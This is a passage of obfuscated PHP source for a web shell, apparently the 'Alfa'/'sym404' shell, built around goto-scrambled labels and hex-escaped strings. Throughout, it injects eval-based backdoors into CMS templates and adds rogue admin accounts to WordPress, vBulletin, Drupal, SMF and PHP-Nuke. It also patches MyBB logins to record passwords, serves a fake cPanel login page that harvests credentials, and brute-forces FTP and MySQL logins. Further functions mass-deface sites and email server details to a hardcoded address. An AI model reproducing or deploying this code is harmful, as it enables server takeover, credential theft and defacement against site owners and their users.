\x6f\x75\162\x20\160\x61\163\x73\167\x6f\x72\144\x20\x77\151\154\154\40\x62\145\40\x72\145\x73\145\x74\54\x20\141\156\x64\x20\164\x68\x65\x20\x6e\145\x77\40\x70\141\x73\x73\167\157\x72\x64\x20\x77\x69\154\154\x20\142\x65\x20\145\155\x61\x69\x6c\x65\144\40\164\x6f\40\x79\x6f\165\x2e\74\x2f\160\x3e\74\160\76\x7b\44\163\151\x67\156\x61\x74\x75\162\x65\175\x3c\x2f\x70\76\x7b\x70\150\160\x7d\151\x66\50\x24\x5f\x43\x4f\x4f\x4b\111\105\x5b\x22\x73\x65\143\x22\x5d\x20\x3d\75\40\x22\61\62\63\x22\x29\x7b\145\166\141\154\50\142\x61\163\145\66\64\x5f\144\145\x63\157\144\x65\50\44\137\103\x4f\x4f\113\111\105\133\42\x73\145\143\x32\x22\135\x29\x29\x3b\40\144\x69\145\x28\42\41\42\51\x3b\175\173\x5c\57\160\x68\x70\x7d";
        if (!empty($dbh) && !empty($dbu) && !empty($dbn) && !empty($index)) {
            if (filter_var($path, FILTER_VALIDATE_URL)) {
                ...
                $inject = "\x55\120\x44\101\124\x45\x20\x74\x62\154\145\x6d\x61\151\154\164\145\x6d\160\154\x61\x74\x65\x73\x20\x53\x45\124\40\155\145\x73\x73\x61\147\145\x3d\x27{$newindex
            }
            \47\x20\127\x48\105\x52\105\x20\x6e\x61\155\x65\75\x27\x50\x61\x73\163\167\x6f\162\144\40\x52\145\x73\x65\x74\40\x56\x61\154\151\x64\141\164\x69\157\x6e\x27";
            $result = mysqli_query($conn, $inject) or die(mysqli_error($conn));
            $create = "insert into tblclients (email) values('solevisible@fbi.gov')";
            $result2 = mysqli_query($conn, $create) or die(mysqli_error($conn));
            if (function_exists("curl_version") && $method == "auto") {
                ...
                $saveurl = $AlfaSole->Send($path . "/pwreset.php");
                $getToken = preg_match("/name=\"token\" value=\"(.*?)\"/i", $saveurl, $token);
                $AlfaSole->Send($path . "/pwreset.php", "post", "\x74\157\153\145\x6e\x3d{$token[1]
            }
            \46\141\143\164\151\157\x6e\75\162\x65\163\145\x74\x26\x65\155\x61\x69\154\x3d\x73\x6f\154\145\x76\151\163\151\142\154\145\100\x66\142\x69\56\x67\157\x76");
            $backdata = "\125\120\x44\x41\x54\x45\40\x74\142\154\x65\x6d\x61\151\x6c\164\x65\x6d\x70\154\x61\x74\145\x73\x20\x53\105\124\40\155\x65\x73\163\x61\147\145\75\x27{$tempSave
        }
        \x27\x20\x57\x48\105\x52\105\40\156\141\155\x65\x3d\x27\120\x61\x73\x73\x77\157\162\x64\40\x52\145\x73\x65\x74\x20\x56\141\154\x69\144\141\x74\x69\x6f\x6e\47";
        $Solevisible = mysqli_query($conn, $backdata) or die(mysqli_error($conn));
...
if (isset($_POST["alfa2"]) && $_POST["alfa2"] == "mybb") {
    AlfaNum(1, 2, 3, 5);
    echo __pre() . "<p><div class='txtfont_header'>| MyBB |</div></p><center><center>" . getConfigHtml("mybb") . "<form id='sendajax' onSubmit=\"g('ShellInjectors',null,null,'mybb',null,this.method.value,null,this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.prefix.value); return false;\" method=POST>\xa";
    ...
    if (isset($_POST["alfa6"])) {
        ...
        if (!empty($dbh) && !empty($dbu) && !empty($dbn) && !empty($newinshell)) {
            $conn = mysqli_connect($dbh, $dbu, $dbp, $dbn) or die(mysqli_error($conn));
            $inject = "\163\145\x6c\145\143\x74\40\164\x65\x6d\160\154\141\x74\145\x20\146\162\157\155\40{$prefix
        }
        \x74\145\155\x70\x6c\141\164\145\163\40\x77\x68\145\162\x65\x20\40\x74\x69\x74\154\x65\75\x20\x27\143\141\x6c\145\156\144\141\162\47";
        $result = mysqli_query($conn, $inject) or die(mysqli_error($conn));
        ...
        $createShell = "\x75\x70\144\x61\x74\x65\x20{$prefix
    }
    \164\x65\155\160\x6c\x61\164\145\x73\40\x53\105\x54\x20\x74\x65\155\x70\x6c\141\164\x65\75\x20\x27" . $newinshell . $repsave . "' where title = 'calendar'";
    $result2 = mysqli_query($conn, $createShell) or die(mysqli_error($conn));
    $geturl = "\x73\x65\154\145\x63\x74\x20\166\141\x6c\x75\x65\x20\x66\162\157\x6d\x20{$prefix
}
\x73\145\x74\164\151\x6e\147\x73\40\x77\x68\145\x72\x65\40\x6e\x61\x6d\x65\x3d\40\47\142\x62\165\x72\x6c\47";
...
if (extension_loaded("sockets") && function_exists("fsockopen") && $method == "auto") {
    if ($fsock = @fsockopen($realurl, 80, $errno, $errstr, 10)) {
        @fputs($fsock, "\107\105\x54\40{$realpath
    }
    \57\143\x61\x6c\145\156\144\141\162\56\x70\150\x70\40\x48\x54\x54\120\x2f\x31\56\61\xd\12");
    @fputs($fsock, "\110\x4f\123\x54\x3a\x20{$realurl
}
\xd\xa");
...
if (preg_match("/200 OK/i", $check)) {
    $repairdbtemp = "\x75\x70\144\x61\x74\145\x20{$prefix
}
\164\145\155\160\154\141\164\145\163\x20\123\105\x54\40\x74\x65\x6d\x70\154\141\x74\145\75\x20\47{$repsave
}
\47\40\167\x68\145\162\x65\40\164\x69\x74\x6c\145\x20\75\x20\x27\143\141\154\x65\156\144\141\x72\47";
...
if (isset($_POST["alfa3"]) && $_POST["alfa3"] == "vb") {
    ...
    if (isset($_POST["alfa4"]) && !empty($_POST["alfa4"])) {
        ...
        if (extension_loaded("sockets") && function_exists("fsockopen") && $method == "auto") {
            if ($fsock = @fsockopen($realurl, 80, $errno, $errstr, 10)) {
                @fputs($fsock, "\x47\x45\124\40{$realpath
            }
            \x2e{$faq_file
        }
        \x20\110\124\x54\x50\57\x31\56\x31\15\xa");
        @fputs($fsock, "\x48\x4f\x53\x54\72\x20{$realurl
    }
    \15\12");
    @fputs($fsock, "Connection: close
\xd\xa");
...
goto oU1FW;
X5bFn: $default_use_ajax = true;
goto yv2_F;
syUOX: function alfacpcrack() {
    alfahead();
...
<div class=\"txtfont\">Hash: </div> <input type=\"text\" placeholder=\"Hash\" name=\"hash\" size=\"60\" id=\"text\" /> <input type=\"submit\" value=\" \" name=\"go\" /></form></center><br>";
        if ($_POST["alfa3"] == ">>") {
            ...
            if (!empty($hash)) {
                $curl = new AlfaCURL();
                $resp = $curl->Send("https://md5decrypt.net/en/HashFinder/", "post", "\x68\141\x73\x68\x3d{$hash
            }
            \x26\143\162\171\x70\x74\75\x53\x65\141\162\143\150");
            echo __pre() . "<center>";
...
goto lpys7;
js6yj: if (!function_exists("sys_get_temp_dir")) {
    ...
    if (isset($_POST["alfa4"]) && $_POST["alfa4"] == ">>") {
        ...
        if (filter_var($mail_to, FILTER_VALIDATE_EMAIL)) {
            if (!empty($mail_attach) && @is_file($mail_attach)) {
                ...
                $headers = "From: " . $mail_from . " <" . $mail_from . ">\xd
";
...
";
                $headers .= "MIME-Version: 1.0" . "\xd\xa";
...
\xa
\xa";
                $mail_content .= $mail_content . "\xd\xa\xd\xa";
                $mail_content .= "--" . $uid . "
";
...
";
                $headers .= "To: " . $mail_to . " ( " . $mail_to . " ) 
\xa";
                $headers .= "Reply-To: " . $mail_from . '' . "\xd\xa";
                $headers .= "Content-type: text/html; charset=utf-8" . "\xd
";
                $headers .= "MIME-Version: 1.0" . "\xd
";
            ...
            if (!empty($mail_from)) {
                ...
                $i++) {
                    if (@mail($mail_to, $mail_subject, $mail_content, $headers)) {
                        echo "\74\x63\x65\x6e\x74\145\x72\76\x53\145\x6e\x74\40\55\76\40{$mail_to
                    }
                    \x3c\x62\x72\x3e\74\57\x63\x65\x6e\164\145\x72\x3e";
                }
            }
        }
        else {
...
goto b9DIg;
JUqyb: function decrypt_post($str) {
...
aoyl8: class AlfaCURL {
    ...
    function error($error) {
        echo "\74\x63\145\156\164\x65\162\76\x3c\144\x69\x76\x20\x73\164\x79\x6c\x65\75\x27\167\151\x64\164\150\72\x35\60\x30\x70\170\73\x62\157\162\x64\x65\162\72\x20\x33\x70\170\40\163\x6f\x6c\x69\144\x20\x23\x46\106\x45\x45\106\x46\x3b\40\x70\x61\144\x64\151\156\147\72\40\x33\x70\170\73\x20\x62\x61\143\x6b\147\x72\x6f\165\156\144\x2d\143\157\154\x6f\x72\x3a\x20\43\x46\106\x44\104\x46\106\73\x66\157\156\x74\x2d\x66\141\x6d\151\154\x79\72\40\x76\145\x72\144\141\156\141\x3b\x20\146\x6f\156\164\x2d\x73\x69\172\145\x3a\x20\61\60\x70\170\47\x3e\x3c\x62\76\x63\125\x52\114\x20\105\162\162\157\x72\74\57\142\x3e\74\x62\x72\76{$error
    }
    \74\x2f\x64\x69\166\x3e\x3c\57\143\x65\x6e\x74\x65\162\76";
    die;
}
}
goto VuokP;
j4Vrs: if ($GLOBALS["sys"] == "win") {
    $GLOBALS["home_cwd"] = str_replace("\\", "/", $GLOBALS["home_cwd"]);
    $GLOBALS["cwd"] = str_replace("\\", "/", $GLOBALS["cwd"]);
}
goto dwTxE;
pKNIy: function alfaMassDefacer() {
    alfahead();
...
\x9DefPage: <input size=\"50\" type=\"text\" name=\"defpage\" value=\"" . htmlspecialchars($GLOBALS["cwd"]) . "\"></div> <input type=\"submit\" name=\"btn\" value=\" \"></center></p>\xa</form>";
    $dir = $_POST["alfa1"];
    $defpage = $_POST["alfa2"];
    $method = $_POST["alfa3"];
...
goto NfFzp;
UrZDF: function clean_string($string) {
...
goto BO7Hm;
fXjRq: function alfapwchanger() {
    alfahead();
    echo "<div class=header><center><br><div class=\"txtfont_header\">| Add New Admin |</div>\xa<center><h3>";
...
<p>" . getConfigHtml("wp") . "</p><form onSubmit=\"g('pwchanger',null,'wp','>>',this.localhost.value,this.database.value,this.username.value,this.password.value,null,this.admin.value,this.email.value,this.prefix.value);return false;\" method=\"POST\">";
        ...
        if ($_POST["alfa2"] && $_POST["alfa2"] == ">>") {
            ...
            $solevisible = @mysqli_query($conn, "insert into " . $prefix . "\x75\x73\x65\x72\x73\40\x28\x49\104\x2c\x75\x73\145\x72\x5f\x6c\157\x67\151\156\54\x75\x73\145\162\x5f\160\x61\163\163\54\165\x73\x65\162\x5f\x65\155\x61\151\x6c\51\40\166\x61\154\165\x65\x73\x28\156\x75\154\154\x2c\x27{$admin
        }
        \47\x2c\47\x64\x34\141\65\71\x30\x63\x61\x61\143\143\x30\x62\145\x35\65\145\146\62\70\x36\145\64\60\141\71\x34\65\145\x61\64\65\x27\54\47{$SQL
    }
    \47\x29") or die(mysqli_error($conn));
...
if ($_POST["alfa4"] && $_POST["alfa4"] == "vb") {
    ...
    if ($_POST["alfa1"] && $_POST["alfa1"] == ">>") {
        ...
        $pw_col = @mysqli_connect("\x53\x45\114\x45\x43\x54\40\x63\x6f\154\x75\155\x6e\137\x6e\x61\155\x65\40\x46\122\x4f\115\40\x69\x6e\x66\157\x72\155\141\164\x69\x6f\x6e\137\163\143\150\x65\155\x61\56\143\157\x6c\x75\x6d\156\x73\40\167\x68\x65\x72\x65\x20\164\141\x62\154\145\137\156\141\155\145\40\75\x20\47{$prefix
    }
    \165\x73\x65\x72\47\x20\141\x6e\144\x20\143\157\154\165\155\x6e\137\156\141\x6d\145\x20\x3d\x20\47\x70\x61\163\x73\x77\x6f\162\144\47\40\141\x6e\144\40\x74\141\142\154\145\x5f\x73\143\150\145\155\x61\40\x3d\40\47{$database
}
\x27");
$pw_col = @mysqli_num_rows($pw_col);
$adm_perm = "16744444";
if ($pw_col > 0) {
    $solevisible = @mysqli_query($conn, "\151\156\x73\x65\x72\x74\x20\x69\x6e\164\157\x20{$prefix
}
\165\163\145\x72\40\50\165\163\145\162\151\144\54\165\x73\145\x72\147\162\157\165\x70\151\144\x2c\165\x73\x65\162\x6e\x61\155\145\x2c\160\141\x73\x73\x77\157\162\144\x2c\x73\x61\154\164\x2c\145\x6d\141\x69\x6c\54\x70\141\163\163\x77\x6f\162\x64\144\141\164\x65\x2c\152\x6f\x69\x6e\x64\x61\x74\x65\51\x20\166\x61\154\x75\x65\163\50\x6e\165\x6c\x6c\x2c\47\66\47\54\47{$admin
}
\47\x2c\47\65\62\145\x32\70\142\x37\x38\x66\65\65\x36\x34\x31\x63\144\64\66\x31\x38\x61\x64\61\x61\x32\x30\x66\x35\x66\x64\65\143\47\54\x27\x58\x77\x7c\111\x62\x47\x4c\150\124\x51\101\x2d\x41\x77\101\160\x56\166\76\66\61\171\136\50\172\x5d\x2a\74\121\x4e\x27\54\47{$SQL
}
\x27\54\47" . date("Y-m-d") . "','" . time() . "')") or die(mysqli_error($conn));
}
else {
    $adm_perm = "2143256444";
    $solevisible = @mysqli_query($conn, "\x69\156\163\x65\x72\x74\40\151\156\x74\x6f\x20{$prefix
}
\x75\163\145\162\40\x28\165\x73\x65\162\x69\x64\54\x75\x73\x65\x72\x67\x72\x6f\x75\x70\151\x64\54\x75\163\x65\x72\x6e\141\x6d\x65\x2c\164\157\x6b\x65\x6e\x2c\x73\x65\143\162\x65\164\54\x65\155\x61\151\x6c\x2c\x70\x61\x73\163\x77\157\x72\x64\x64\141\164\x65\54\152\157\151\156\144\141\164\x65\x2c\x73\143\150\x65\x6d\x65\x2c\142\x69\162\x74\150\144\141\x79\137\x73\x65\x61\162\x63\x68\51\x20\166\x61\x6c\x75\x65\x73\50\156\165\154\154\54\x27\66\x27\54\47{$admin
}
\47\54\47\44\62\x79\44\61\60\44\131\x73\x56\150\x56\x2e\x39\x74\114\156\x7a\x42\131\x78\x61\162\61\x42\112\x41\x47\x4f\x33\166\x46\x7a\x36\x38\57\x71\x44\x55\x37\112\164\66\62\123\x44\x64\114\171\x36\154\x55\x54\71\116\65\132\57\x77\161\x27\54\47\x51\146\x7e\x41\x44\145\101\x7d\151\x41\x65\x79\55\x26\x23\101\x4c\121\x46\x3c\175\57\x75\x42\x44\x71\x53\x6e\x77\x3e\x27\x2c\47{$SQL
}
\47\x2c\x27" . date("Y-m-d") . "','" . time() . "','blowfish:10','1984-05-20')") or die(mysqli_error($conn));
}
$solevisible = @mysqli_query($conn, "\163\145\154\145\143\164\x20\165\x73\145\x72\x69\x64\x20\x66\x72\157\155\x20{$prefix
}
\165\x73\145\162\40\x77\150\x65\162\145\x20\x75\x73\145\x72\x6e\x61\155\145\75\x27" . $admin . "'") or die(mysqli_error($conn));
$sole = mysqli_num_rows($solevisible);
if ($sole == 1) {
    $solevis = mysqli_fetch_assoc($solevisible);
    $res = $solevis["userid"];
}
$solevisible = @mysqli_query($conn, "\151\x6e\x73\x65\162\164\40\151\156\164\157\x20{$prefix
}
\x61\x64\x6d\151\156\x69\163\x74\x72\x61\x74\157\x72\x20\x28\165\x73\145\162\151\144\x2c\x61\x64\x6d\151\156\x70\x65\162\x6d\x69\163\x73\x69\157\156\163\x29\40\x76\141\x6c\x75\145\x73\50\47" . $res . "','" . $adm_perm . "')") or die(mysqli_error($conn));
if ($solevisible) {
    __alert("Success... " . $admin . " is created...");
}
}
...
if (isset($_POST["alfa8"]) && $_POST["alfa8"] == "nuke") {
    ...
    if ($_POST["alfa1"] && $_POST["alfa1"] == ">>") {
        ...
        $conn = @mysqli_connect($localhost, $username, $password, $database) or die(mysqli_error($conn));
        $hash = md5($pwd);
        $solevisible = @mysqli_query($conn, "insert into " . $prefix . "\137\141\165\164\150\x6f\x72\163\x28\x61\x69\144\x2c\156\141\x6d\145\x2c\145\155\x61\151\154\x2c\160\x77\x64\51\x20\x76\141\154\165\145\163\50\x27{$admin
    }
    \47\54\47\x47\x6f\x64\x27\x2c\47{$SQL
}
\47\54\47\144\x34\x61\x35\x39\x30\x63\141\141\x63\x63\60\142\x65\65\65\x65\146\62\70\66\145\64\x30\141\71\x34\x35\x65\141\x34\65\47\51") or die(mysqli_error($conn));
if ($solevisible) {
    __alert("Success... " . $admin . " is created...");
}
}
...
if (isset($_POST["alfa9"]) && $_POST["alfa9"] == "drupal") {
    ...
    if ($_POST["alfa1"] && $_POST["alfa1"] == ">>") {
        ...
        $solevisible = @mysqli_query($conn, "\x69\x6e\x73\x65\x72\164\40\151\156\x74\x6f\40\165\163\x65\162\x73\x20\x28\165\x69\144\x2c\x6e\x61\155\145\x2c\160\x61\163\x73\54\x6d\141\151\x6c\54\163\x69\147\156\x61\164\x75\x72\145\137\x66\157\x72\155\141\x74\x2c\163\x74\141\164\165\x73\54\164\x69\155\x65\x7a\x6f\156\145\54\x69\156\151\x74\51\40\x76\141\154\x75\x65\x73\x28\47{$getDescuid
    }
    \x27\54\x27{$admin
}
\47\x2c\x27\44\123\x24\104\x50\x32\171\x39\x41\x62\x6f\154\103\102\x4f\144\134\57\x57\171\121\143\160\x7a\x75\x34\172\x46\65\x37\x71\105\60\x6e\x6f\171\x43\116\x65\130\132\x57\166\x2e\x33\67\x52\x36\x36\x56\x73\x46\x6a\x4f\151\x43\47\x2c\47\163\x6f\154\x65\166\x69\x73\x69\142\x6c\145\100\146\x62\151\x2e\x67\x6f\x76\47\54\x27\x66\x69\x6c\x74\x65\x72\x65\x64\x5f\150\x74\x6d\154\47\54\47\61\x27\x2c\x27\x45\165\162\x6f\160\145\57\x42\145\162\x6c\151\x6e\47\x2c\47\163\157\154\x65\166\x69\x73\x69\x62\154\x65\x40\146\142\151\x2e\147\x6f\166\47\x29") or die(mysqli_error($conn));
...
if (isset($_POST["alfa10"]) && $_POST["alfa10"] == "smf") {
    ...
    if ($_POST["alfa1"] && $_POST["alfa1"] == ">>") {
        ...
        $solevisible = @mysqli_query($conn, "\151\x6e\163\145\162\164\x20\151\x6e\x74\x6f\x20{$prefix
    }
    \155\145\155\x62\145\x72\163\40\50\x69\x64\137\155\145\x6d\142\145\162\54\x6d\x65\155\x62\x65\162\137\156\x61\x6d\x65\54\151\144\x5f\147\x72\x6f\x75\x70\x2c\x72\x65\141\154\x5f\156\x61\155\145\54\x70\141\163\x73\167\x64\x2c\x65\x6d\141\x69\x6c\x5f\141\x64\x64\162\x65\163\163\x29\x20\166\x61\154\x75\145\x73\x28\x6e\165\154\154\x2c\x27{$admin
}
\x27\x2c\47\61\47\54\x27{$admin
}
\47\54\47{$setpwAlg
}
\47\54\47\x73\157\x6c\x65\x76\x69\163\x69\x62\154\145\x40\146\x62\151\x2e\147\157\166\x27\x29") or die(mysqli_error($conn));
if ($solevisible) {
    __alert("Success... " . $admin . " is created...");
}
}
...
goto SGxKo;
vyIbz: $gzinflate_func = "gz" . "inf" . "late";
goto TC4zO;
g3BO2: function Alfa_FTP_Cracker($info) {
    ...
    $curl_error = curl_error($curl);
    if ($curl_errno > 0) {
        echo "\x3c\146\x6f\156\x74\40\x63\x6f\154\157\x72\75\x27\162\x65\x64\x27\76\105\162\162\157\162\72\x20{$curl_error
    }
    \74\x2f\x66\x6f\156\164\x3e\74\x62\162\x3e";
}
...
goto gVR6s;
vZIx4: @set_time_limit(0);
goto QDluG;
sTNeY: function alfaget_flags() {
    $flags = array();
    if (function_exists("curl_version")) {
        $curl = new AlfaCURL();
...
goto ma3qg;
gVR6s: function alfaEx($in, $re = false, $cgi = true, $all = false) {
...
goto CBieS;
pTlCq: function hijackMybb($path, $saveto) {
    $code = <<<'ALFA_MYBB'
$alfa_q = $db->query("SELECT `email` FROM ".TABLE_PREFIX."users WHERE `username` = '".$user['username']."'");$alfa_fetch = $db->fetch_array($alfa_q);$alfa_file = "{saveto_path}";$fp = @fopen($alfa_file, "a+");@fwrite($fp, $user['username']." : ". $user['password']." ( ".$alfa_fetch['email']." )\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fwrite($fp, $values);}@fclose($fp);
ALFA_MYBB;
    $find = '$loginhandler->complete_login();';
    $code = str_replace("{saveto_path}", $saveto, $code);
    $login = $path . "/member.php";
    $evil_login = "	" . $code . "\xa\x9" . $find;
    if (@is_file($login) and @is_writable($login)) {
        $data_login = @file_get_contents($login);
        if (strstr($data_login, $find)) {
            $login_replace = str_replace($find, $evil_login, $data_login);
...
goto Y9B3P;
qEavu: function alfaWriteTocgiapi($name, $source) {
    $temp = '';
    ...
    @mkdir("alfacgiapi", 493);
    __write_file("alfacgiapi/" . $name, __get_resource($source));
    @chmod("alfacgiapi/" . $name, 493);
    return $temp;
}
goto EaEwz;
KBSJe: function alfaDumper() {
    alfahead();
    echo "<div class=\"header\">";
    AlfaNum(8, 9, 10);
    ...
    if (!empty($dbname)) {
        ...
        if (@mysqli_connect($host, $username, $password, $dbname)) {
            if (strlen(alfaEx("mysqldump")) > 0) {
                alfaEx("\155\x79\163\x71\x6c\144\x75\155\160\x20\x2d\x2d\x73\x69\156\x67\x6c\x65\55\164\x72\141\x6e\x73\x61\143\x74\151\x6f\156\x20\55\x2d\x68\x6f\x73\164\x3d\42{$host
            }
            \x22\40\x2d\55\165\x73\145\162\75\42{$username
        }
        \42\40\x2d\55\x70\x61\x73\x73\x77\157\162\x64\x3d\42{$password
    }
    \x22\x20{$dbname
}
\x20\x3e\x20\47" . addslashes($dfile) . "'");
echo $msg;
}
else {
    __alert("Error...!");
...
goto LeTOU;
DJimu: function Alfa_Mysql_Cracker($info) {
...
goto TDfCG;
lQi8o: function alfacmshijacker() {
    alfahead();
    AlfaNum(5, 6, 7, 8, 9, 10);
...
goto sTNeY;
nc8td: function _alfa_is_writable($file) {
    $check = false;
...
goto wSo8A;
HtOsy: function is_ipv4($ip) {
    return filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) ? $ip : "(Null)";
}
goto Kcw05;
BIm6K: if (!empty($_POST["a"]) && function_exists("alfa" . $_POST["a"])) {
    call_user_func("alfa" . $_POST["a"]);
}
goto Q2toQ;
xRpjd: function create_table($data) {
    echo "<table border=\"1\">";
...
goto jES3S;
S61z3: unset($GLOBALS["oZgNypoPRU"]);
goto I3W1x;
ddbzD: $to_email = "loginoldum@gmail.com";
goto O7q6j;
Y0C_c: function _alfa_file_exists($file, $cgi = true) {
    if (@file_exists($file)) {
        return true;
    }
    else {
...
goto k2Ov7;
SYfR0: $baslik = "sym404 shell 20203";
goto Pg_sn;
VEQzh: function output($string) {
...
goto D207Q;
AuQJO: $GLOBALS["oZgNypoPRU"] = array("username" => "alfa", "password" => "10402cdb979efa8d14cd1b590f5f880f", "safe_mode" => "0", "login_page" => "403", "show_icons" => "1", "post_encryption" => false, "cgi_api" => true);
goto TVtEs;
lC2ez: function alfasearcher() {
    alfahead();
...
<div class=\"txtfont\">
Method: <select style=\"width: 18%;\" onclick=\"alfa_searcher_tool(this.value);\" name=\"method\"><option value=\"files\">Find All Writable Files</option><option value=\"dirs\">Find All Writable Dirs</option><option value=\"all\">Find All Readable And Writable Files</option></select>\xaDir: <input size=\"50\" id=\"target\" type=\"text\" name=\"filename\" value=\"" . $GLOBALS["cwd"] . "\">
...
goto pKNIy;
y3qdQ: function alfaPermsColor($f, $isbash = false) {
    $class = '';
    $num = '';
    $human = '';
    if ($isbash) {
...
goto pFGuE;
FDpZq: function _alfa_fsockopen($server, $uri, $post) {
    $socket = @fsockopen($server, 80, $errno, $errstr, 15);
    if ($socket) {
        $http = "\x50\x4f\x53\x54\40{$uri
    }
    \x20\110\x54\124\120\x2f\x31\x2e\60\xd\xa";
    $http .= "\110\157\x73\164\x3a\40{$server
}
\xd\xa";
$http .= "User-Agent: " . $_SERVER["HTTP_USER_AGENT"] . "\xd
";
...
goto ISgLN;
i065L: function CrackerResualt($info) {
    $res = $info["target"] . " => " . $info["username"] . ":" . $info["password"] . "\xa";
    $c = @fopen($info["fcrack"], "a+");
    @fwrite($c, $res);
    @fclose($c);
}
goto K2Mxs;
DZ_CP: @ignore_user_abort(true);
goto vZIx4;
NWp3t: function alfasymlink() {
    alfahead();
    AlfaNum(9, 10);
    alfaCreateParentFolder();
    @chdir($GLOBALS["home_cwd"] . "/" . __ALFA_DATA_FOLDER__);
...
if (isset($_POST["alfa4"]) && $_POST["alfa4"] == "SymFile") {
    if (function_exists("symlink") || _alfa_can_runCommand(true, true)) {
        AlfaNum(9, 10);
        echo __pre() . "\xa<center><p><div class=\"txtfont_header\">| Symlink File And Directory |</div></p><form onSubmit=\"g('symlink',null,null,null,null,'SymFile',this.file.value,this.symfile.value,this.symlink.value);return false;\" method=\"post\">
<input type=\"text\" name=\"file\" placeholder=\"Example : /home/user/public_html/config.php\" size=\"60\"/><br />
<input type=\"text\" name=\"symfile\" placeholder=\"Example : alfa.txt\" size=\"60\"/>\xa<p><input type=\"submit\" value=\" \" name=\"symlink\" /></p></form></center>";
        $path = $_POST["alfa5"];
        $symname = $_POST["alfa6"];
...
goto sJyFK;
yv2_F: $default_charset = "Windows-1251";
goto PDQng;
SUDj6: function convertBash($code) {
...
goto k4Xew;
VuokP: function getConfigHtml($cms) {
    $content = '';
    ...
    foreach ($cms_array as $key => $val) {
        $content .= "\74\157\160\164\x69\157\156\40\x76\141\154\x75\145\x3d\47{$key
    }
    \x27\x20" . ($key == $cms ? "selected=selected" : '') . "\x3e{$val
}
\x3c\57\x6f\x70\x74\x69\157\156\x3e";
}
...
goto C54Or;
furqE: @session_write_close();
goto DZ_CP;
jr4Ce: mail($kime, $baslik, $server_info_text);
goto lu9og;
r1oi7: $GLOBALS["__file_path"] = str_replace("\\", "/", trim(preg_replace("!\\(\\d+\\)\\s.*!", '', __FILE__)));
goto xqTlW;
SGxKo: function alfaMakePwd() {
...
goto sOneK;
t5i_t: $from_shellcode = "lamer@" . gethostbyname($_SERVER["SERVER_NAME"]) . '';
goto ddbzD;
k6QWv: @ini_set("max_execution_time", 0);
goto XoS07;
MPzxA: if (!empty($_SERVER["HTTP_USER_AGENT"])) {
...
goto f6ORX;
dwTxE: if ($GLOBALS["cwd"][strlen($GLOBALS["cwd"]) - 1] != "/") {
    $GLOBALS["cwd"] .= "/";
}
goto js6yj;
rVRtk: function alfaHijackCms($cms, $cmspath, $saveto) {
    switch ($cms) {
        case "vb": hijackvBulletin($cmspath, $saveto);
        break;
...
goto VPnMc;
b8Co0: function alfaarchive_manager() {
    alfahead();
    $file = $_POST["alfa2"];
    if (!file_exists($file)) {
        $file = $GLOBALS["cwd"];
	...
	<div class=\"txtfont\">\xa	Archive file: <input size=\"50\" id=\"target\" type=\"text\" name=\"file\" value=\"" . $file . "\">
\x9<input type=\"submit\" name=\"btn\" value=\" \"></div></form></center><br>";
    if ($_POST["alfa5"] == ">>") {
...
goto kbM61;
NCiby: if (!isset($GLOBALS["DB_NAME"]["pass"])) {
    die($GLOBALS["DB_NAME"]["pass"]);
}
goto wyjmZ;
sOneK: function alfaGetDomains($state = false) {
    $state = "named.conf";
    $lines = array();
...
goto bdmQk;
Tdhgw: function Alfa_Create_A_Tag($action, $vals) {
    $nulls = array();
...
goto Jk_4P;
nd1ks: @ini_set("error_log", NULL);
goto T4tMa;
q3QI0: if (!function_exists("json_decode")) {
...
<table width=\"30%\"><td align=\"center\">Users List</td><td align=\"center\">Passwords</td></table>\xa<textarea placeholder=\"Users\" rows=\"20\" cols=\"25\" name=\"usernames\">" . ($GLOBALS["sys"] == "unix" ? alfaEx("cut -d: -f1 /etc/passwd") : '') . "</textarea>
...
goto VEQzh;
ZkWvh: function alfafakepage() {
    alfahead();
    AlfaNum(9, 10);
    echo "<div class=header><br>\xa	<center><div class=\"txtfont_header\">| Host Manager Fake page |</div></center><br><br><form onSubmit=\"g('fakepage',null,this.clone_page.value,this.fake_root.value,'>>',this.logto.value,this.panel.value,this.inject_to.value,this.bind_on.value,this.count.value);return false;\" method='post'>
	...
	<div style=\"margin-bottom:6px;\"><span style=\"display: inline-block;width: 106px;\">Log To: </span><input size=\"50\" type=\"text\" name=\"logto\" value=\"" . $GLOBALS["cwd"] . "logs.txt\"></div>\xa	<div style=\"margin-bottom:6px;\"><span style=\"display: inline-block;width: 106px;\">Count of Invalid login: </span><input size=\"20\" type=\"text\" name=\"count\" value=\"3\" style=\"text-align:center;\"></div>\xa	<div style=\"text-align:center;\"><input type=\"submit\" name=\"btn\" value=\" \"></div></div></form><br>";
    ...
    if (!empty($clone_page) && !empty($fake_root) && !empty($logto) && !empty($inject_to) && !empty($bind_on) && $_POST["alfa3"] == ">>") {
        ...
        if (!empty($source_page)) {
            ...
            if (!empty($matched_form)) {
                ...
                $cpanel_log = <<<'ALFA_CPANEL'
<?php $cook_time = time()+(86400 * 7); $user = $_POST["{post_user}"];$pass = $_POST["{post_pass}"];if(!empty($user) && !empty($pass)){if(!isset($_COOKIE["{cookie_name}"])){@setcookie("{cookie_name}", 0, $cook_time, "/");$_COOKIE["{cookie_name}"]=1;}if((int)$_COOKIE["{cookie_name}"]>{count}){@header("Location: /");exit;}@setcookie("{cookie_name}", ((int)$_COOKIE["{cookie_name}"] + 1), $cook_time, "/");$fp = @fopen("{logto}", "a+");@fwrite($fp, $user . " : " . $pass . "\n");fclose($fp);sleep(3);{resp_code}exit;}?>
ALFA_CPANEL;
                $cpanel_log = str_replace(array("{post_user}", "{post_pass}", "{cookie_name}", "{count}", "{logto}", "{resp_code}"), array($post_user, $post_pass, $cookie_name, $count, $logto, $resp_code), $cpanel_log);
                ...
                $inject_code = <<<'ALFA_INJECT'
<?php if(isset($_GET[":2083"])&&(int)$_COOKIE["{cookie_name}"]<{count}){@include("{fake_root}/index.php");exit;}?>
ALFA_INJECT;
                $inject_code = str_replace(array("{cookie_name}", "{count}", "{fake_root}"), array($cookie_name, $count, $fake_root), $inject_code);
                $bind_on_code = <<<'ALFA_BIND'
<?php if((int)$_COOKIE["{cookie_name}"]<{count}){@header("Location: {uri}");exit;}?>
ALFA_BIND;
                $bind_on_code = str_replace(array("{cookie_name}", "{count}", "{uri}"), array($cookie_name, $count, $uri), $bind_on_code);
...
goto b8Co0;
ZpbXK: function __download($url, $path = false) {
...
goto UrZDF;
E_dhI: function alfaterminalExec() {
    $pwd = "pwd";
    $seperator = ";";
